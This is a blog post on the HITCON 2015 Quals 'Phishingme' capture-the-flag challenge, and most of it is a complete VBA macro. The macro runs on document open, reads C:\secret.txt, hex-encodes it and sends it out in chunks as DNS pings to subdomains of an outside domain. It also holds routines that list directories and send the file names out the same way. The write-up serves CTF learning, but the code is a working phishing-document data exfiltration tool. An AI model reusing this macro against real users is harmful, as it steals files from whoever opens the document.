---
layout: post
title: "HITCON 2015 Quals: Phishingme"
modified: 2015-10-19
tags: hitcon hitcon2015quals
---
*This challenge was solved by and the write up was written by two of my teammates, vasporig and aljasPOD.*  

If we send in a document, the macro inside it gets executed.

Our way of coummunicating with the outside world was to execute a ping to a subdomain of ours: <data>.dns.aljaspod.com, for which we've captured all the requests with wireshark.

Most time was spent by locating the file containing the flag (C:\secret.txt), after looking for any file containing ""flag"" I've tried listing the root of C:.

Since the file could contain characters not allowed by the dns, and could be of any length, (after some tries) I've converted the flag into hex, and cut it into 16 character parts, sending the following "request" (ping) sequence:

{% highlight text %}
start.dns.aljaspod.com
<flaghex0-15>.0.dns.ajaspod.com
<flaghex16-31>.1.dns.ajaspod.com
...
<flaghex-end>.k.dns.ajaspod.com
end.k+1.dns.aljaspod.com
{% endhighlight %}

Converting the hex back resulted in the flag.

VBA code:

{% highlight vb.net %}
Function ReadFile(fname As String) As String
Dim result As String
    Set objFS = CreateObject("Scripting.FileSystemObject")
    Set objFile = objFS.GetFile(fname)
    Set ts = objFile.OpenAsTextStream(1, -2)
    Do Until ts.AtEndOfStream
         result = result & ts.ReadLine
    Loop
    ts.Close

    ReadFile = result
End Function


Function WinDirList() As String
Dim objFSO As Object
Dim objFolder As Object
Dim objFile As Object
Dim result As String
Dim desktopDir As String
Dim currDir As String

    'Create an instance of the FileSystemObject
    Set objFSO = CreateObject("Scripting.FileSystemObject")


    currDir = CurDir()
    'CreateObject("WScript.Shell").CurrentDirectory
    Set objFolder = objFSO.GetFolder(currDir)
    'loops through each file in the directory and prints their names and path
    For Each objFile In objFolder.Files
        'print file name
        result = result & ";" & objFile.path
         'print file name
        If InStr(1, objFile.path, "flag") > 0 Then

        End If
    Next objFile


    'Get the folder object
    desktopDir = CreateObject("WScript.Shell").SpecialFolders("MyDocuments")
    Set objFolder = objFSO.GetFolder(desktopDir)
    'loops through each file in the directory and prints their names and path
    For Each objFile In objFolder.Files
        'print file name
        If InStr(1, objFile.path, "flag") > 0 Then

        End If
        result = result & ";" & objFile.path
    Next objFile


    WinDirList = result

End Function
Function toDomain(tmpStr As String) As String

        tmpStr = Replace(tmpStr, " ", "_")
        tmpStr = Replace(tmpStr, "\", ".")
        tmpStr = Replace(tmpStr, ":", ".")
        tmpStr = Replace(tmpStr, "(", ".")
        tmpStr = Replace(tmpStr, "{", ".")
        tmpStr = Replace(tmpStr, "}", ".")
        tmpStr = Replace(tmpStr, ")", ".")
        tmpStr = Replace(tmpStr, "..", ".")
        tmpStr = Replace(tmpStr, "..", ".")
        tmpStr = Replace(tmpStr, "..", ".")
        tmpStr = Replace(tmpStr, "..", ".")
        toDomain = tmpStr
End Function


Sub PWD()
Dim strTemp As String
Dim tmpStr As String
Dim currDir As String

    currDir = CurDir()
    currDir = TrailingSlash(currDir)
    Debug.Print toDomain(currDir)
    ExecIt (toDomain(currDir))
    strTemp = Dir(currDir)
    Do While strTemp <> vbNullString
       Debug.Print toDomain(strTemp)
       ExecIt (toDomain(strTemp))
       strTemp = Dir()
    Loop

End Sub


Sub ExecIt(domain As String)
Dim strProgramName As String
    'Debug.Print domain
    Call Shell("ping -n 1 -a " & domain, vbNormalFocus)
End Sub


Public Function RecursiveDir(colFiles As Collection, _
                             strFolder As String, _
                             strFileSpec As String, _
                             bIncludeSubfolders As Boolean)

    Dim strTemp As String
    Dim colFolders As New Collection
    Dim vFolderName As Variant
    Dim tmpStr As String

    'Add files in strFolder matching strFileSpec to colFiles
    strFolder = TrailingSlash(strFolder)
    strTemp = Dir(strFolder & strFileSpec)
    Do While strTemp <> vbNullString
        colFiles.Add strFolder & strTemp
        Debug.Print strFolder & strTemp
        ExecIt (toDomain(strFolder & strTemp))
        strTemp = Dir()
    Loop

    If bIncludeSubfolders Then
        'Fill colFolders with list of subdirectories of strFolder
        strTemp = Dir(strFolder, vbDirectory)
        Do While strTemp <> vbNullString
            If (strTemp <> ".") And (strTemp <> "..") Then
                If (GetAttr(strFolder & strTemp) And vbDirectory) <> 0 Then
                    colFolders.Add strTemp
                    ExecIt (toDomain(strFolder & strTemp))
                End If
            End If
            strTemp = Dir
        Loop

        'Call RecursiveDir for each subfolder in colFolders
        For Each vFolderName In colFolders
            'ignore erros
            On Error Resume Next
            'Debug.Print strFolder
            Call RecursiveDir(colFiles, strFolder & vFolderName, strFileSpec, True)
        Next vFolderName
    End If

End Function


Public Function TrailingSlash(strFolder As String) As String
    If Len(strFolder) > 0 Then
        If Right(strFolder, 1) = "\" Then
            TrailingSlash = strFolder
        Else
            TrailingSlash = strFolder & "\"
        End If
    End If
End Function

Public Function GetFileBytes(ByVal path As String) As Byte()
    Dim lngFileNum As Long
    Dim bytRtnVal() As Byte
    lngFileNum = FreeFile
    If LenB(Dir(path)) Then ''// Does file exist?
        Open path For Binary Access Read As lngFileNum
        ReDim bytRtnVal(LOF(lngFileNum) - 1&) As Byte
        Get lngFileNum, , bytRtnVal
        Close lngFileNum
    Else
        Err.Raise 53
    End If
    GetFileBytes = bytRtnVal
    Erase bytRtnVal
End Function

    Private Function ByteArrayToHex(ByRef ByteArray() As Byte) As String
        Dim l As Long, strRet As String

        For l = LBound(ByteArray) To UBound(ByteArray)
            strRet = strRet & Hex$(ByteArray(l))
        Next l
    ByteArrayToHex = strRet
    End Function

Sub Document_Open()
Dim msg As String
Dim l As Integer
Dim k As Integer
Dim Hex As String
Dim bytFile() As Byte
Dim myFile As String
Dim textline As String
Dim colFiles As New Collection
Dim vFile As Variant
    'ignore errors
    'On Error Resume Next
    'Debug.Print "=================================================================="
    ExecIt ("start.dns.aljaspod.com")
    'PWD
    bytFile = GetFileBytes("c:\secret.txt")
    Hex = ByteArrayToHex(bytFile)
    k = Len(Hex) / 16 + 1
    For l = 0 To k
        msg = Left(Hex, 16)
        If Len(Hex) < 16 Then
            Hex = ""
        Else
            Hex = Right(Hex, Len(Hex) - 16)
        End If
        ExecIt (toDomain(msg + "." + CStr(l) + ".dns.aljaspod.com"))
    Next l
    ExecIt ("end." + CStr(k) + ".dns.aljaspod.com")

End Sub
{% endhighlight %}